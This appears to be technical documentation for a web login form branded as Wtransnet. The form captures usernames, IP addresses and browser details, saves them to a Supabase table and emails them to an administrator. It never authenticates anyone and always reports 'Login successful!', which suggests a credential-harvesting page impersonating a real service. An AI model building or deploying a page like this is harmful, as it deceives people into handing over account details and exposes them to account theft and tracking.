# Data Flow Documentation

## Complete Login Data Flow

### 1. User Input
```
┌─────────────────────────┐
│  Login Form             │
├─────────────────────────┤
│ • Username              │
│ • Password              │
│ • Remember me (checkbox)│
└────────┬────────────────┘
         │
         ▼
```

### 2. Data Processing
```
┌────────────────────────────────────┐
│  Browser Captures                  │
├────────────────────────────────────┤
│ • Username (trimmed)               │
│ • Email (auto-generated if needed) │
│ • IP Address (from ipify API)      │
│ • User Agent (browser info)        │
│ • Timestamp (now)                  │
│ • Remember me preference           │
└────┬──────────────────────────┬────┘
     │                          │
     ▼                          ▼
```

### 3. Dual Storage

#### Path A: Supabase Database
```
┌─────────────────────────────────┐
│  Supabase Postgres DB           │
├─────────────────────────────────┤
│ Table: login_attempts           │
│                                 │
│ id ◄─ (auto-generated)          │
│ username ◄─ "john_doe"          │
│ email ◄─ "john@example.com"     │
│ login_timestamp ◄─ now()        │
│ ip_address ◄─ "192.168.1.1"     │
│ user_agent ◄─ "Mozilla/..."     │
│                                 │
│ Status: ✓ Persisted             │
└─────────────────────────────────┘
```

#### Path B: EmailJS Notification
```
┌─────────────────────────────────┐
│  EmailJS Service                │
├─────────────────────────────────┤
│ Service: Your configured email  │
│ Template: Wtransnet_Login       │
│                                 │
│ Email Parameters:               │
│ • to_email: admin@example.com   │
│ • username: "john_doe"          │
│ • user_email: "john@example.com"│
│ • timestamp: "1/1/2024 10:30am" │
│ • ip_address: "192.168.1.1"     │
│ • remember_me: "Yes"            │
│                                 │
│ Status: ✓ Email Sent            │
└─────────────────────────────────┘
```

## Data Structure Details

### Supabase Table Schema
```sql
CREATE TABLE login_attempts (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  username text NOT NULL,
  email text,
  login_timestamp timestamptz DEFAULT now(),
  ip_address text,
  user_agent text
);
```

### Sample Data in Supabase
```
id                                   username    email                  login_timestamp           ip_address      user_agent
12345678-1234-1234-1234-123456789012 john_doe    john@example.com       2024-01-15 10:30:45+00   203.0.113.42    Mozilla/5.0 (Windows NT 10.0; Win64; x64)
87654321-4321-4321-4321-210987654321 admin       admin@wtransnet.com    2024-01-15 10:35:12+00   198.51.100.89   Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
```

### Email Template Variables
```
Template Variable    →    JavaScript Value        →    Email Display
{{username}}        →    "john_doe"              →    john_doe
{{user_email}}      →    "john@example.com"      →    john@example.com
{{timestamp}}       →    "1/15/2024, 10:30:45"   →    1/15/2024, 10:30:45
{{ip_address}}      →    "203.0.113.42"          →    203.0.113.42
{{remember_me}}     →    "Yes" or "No"           →    Yes or No
{{to_email}}        →    "admin@example.com"     →    admin@example.com
```

## Code Execution Flow

```javascript
// 1. User submits form
loginForm.addEventListener('submit', async (e) => {
  // 2. Extract values
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  const remember = document.getElementById('remember').checked;

  // 3. Get IP address
  const ip_address = await getClientIP();

  // 4. Prepare data
  const loginData = {
    username,
    email: username.includes('@') ? username : `${username}@wtransnet.com`,
    ip_address,
    user_agent: navigator.userAgent
  };

  // 5. Save to Supabase
  await supabase
    .from('login_attempts')
    .insert([loginData]);

  // 6. Send email
  await emailjs.send(
    'SERVICE_ID',
    'TEMPLATE_ID',
    emailParams
  );

  // 7. Show success message
  alert('Login successful!');
});
```

## Data Validation

### Input Validation
```javascript
if (!username || !password) {
  alert('Please fill in all fields');
  return; // ← Stops execution if validation fails
}
```

### Email Format Processing
```javascript
// If username is already an email:
const userEmail = "john@example.com";
// Result: "john@example.com"

// If username is not an email:
const userEmail = "john_doe" + "@wtransnet.com";
// Result: "john_doe@wtransnet.com"
```

## Error Handling

```
┌─────────────────────────────────────┐
│  Error Occurs (at any step)         │
├─────────────────────────────────────┤
│ • Supabase insert fails             │
│ • Email sending fails               │
│ • IP fetch fails                    │
│ • Network error                     │
└────┬──────────────────────────────┬─┘
     │                              │
     ├─→ Log to console             │
     │   console.error(error)       │
     │                              │
     └─→ Show to user               │
         alert('Error: ...')        │
```

## Async Operation Timeline

```
0ms   ├─ Form submitted
      │
5ms   ├─ getClientIP() starts
      │  └─ Fetch to ipify API
      │
50ms  ├─ getClientIP() completes
      │  └─ IP address received
      │
55ms  ├─ Supabase insert starts
      │
150ms ├─ Supabase insert completes
      │  └─ Data saved to database
      │
160ms ├─ EmailJS send starts
      │
500ms ├─ EmailJS send completes
      │  └─ Email queued/sent
      │
505ms ├─ Success message displayed
      │  └─ Form cleared
      │
      └─ Complete
```

## Security Considerations

### Data in Transit
- ✓ Supabase: Encrypted via HTTPS/SSL
- ✓ EmailJS: Encrypted via HTTPS/SSL
- ✓ IP Address: Public data (user's own IP)

### Data at Rest
- ✓ Supabase: Database encryption (managed by Supabase)
- ✓ Email: Provider's email system encryption

### What NOT to Store
- ✗ Passwords (this form doesn't store them)
- ✗ Credit card data
- ✗ Sensitive personal info
- ✗ API keys/secrets

## Query Examples

### View all login attempts
```sql
SELECT * FROM login_attempts
ORDER BY login_timestamp DESC;
```

### Count logins by day
```sql
SELECT
  DATE(login_timestamp) as date,
  COUNT(*) as login_count
FROM login_attempts
GROUP BY DATE(login_timestamp)
ORDER BY date DESC;
```

### Find logins from specific IP
```sql
SELECT * FROM login_attempts
WHERE ip_address = '192.168.1.1'
ORDER BY login_timestamp DESC;
```

### Most recent logins
```sql
SELECT
  username,
  email,
  login_timestamp,
  ip_address
FROM login_attempts
ORDER BY login_timestamp DESC
LIMIT 10;
```

## Performance Notes

### Data Size (per login attempt)
- username: ~20 bytes
- email: ~50 bytes
- timestamp: ~8 bytes
- ip_address: ~15 bytes
- user_agent: ~100 bytes
- **Total: ~193 bytes per record**

### Typical Response Times
- IP fetch: 50-200ms
- Supabase insert: 100-300ms
- EmailJS send: 200-1000ms
- **Total flow: 400-1500ms**

## Monitoring & Analytics

### Key Metrics to Track
1. Total login attempts
2. Unique usernames
3. Peak login times
4. Failed attempts (invalid input)
5. Geographic distribution (by IP)
6. Browser/device types (by user_agent)
7. Remember me usage

### Sample Dashboard Query
```sql
SELECT
  DATE_TRUNC('hour', login_timestamp) as hour,
  COUNT(*) as attempts,
  COUNT(DISTINCT username) as unique_users,
  COUNT(DISTINCT ip_address) as unique_ips
FROM login_attempts
WHERE login_timestamp > NOW() - INTERVAL '24 hours'
GROUP BY hour
ORDER BY hour DESC;
```
